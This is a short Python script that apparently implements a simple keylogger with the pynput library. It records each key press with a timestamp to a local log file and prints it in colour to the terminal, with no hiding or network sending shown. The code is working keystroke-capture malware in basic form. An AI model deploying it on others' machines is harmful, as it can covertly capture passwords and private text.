from pynput import keyboard
from datetime import datetime
from rich.console import Console
from rich.text import Text

console = Console()

def write_log(data):
    log_entry = f"{datetime.now()} - {data}"
    with open("logs/keystroke_log.txt", "a") as f:
        f.write(log_entry + "\n")
    # Terminal colorful output
    console.print(f"[bold cyan]{datetime.now()}[/] - [yellow]{data}[/]")

def on_press(key):
    try:
        write_log(f"Key pressed: {key.char}")
    except AttributeError:
        write_log(f"Special key pressed: {key}")

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
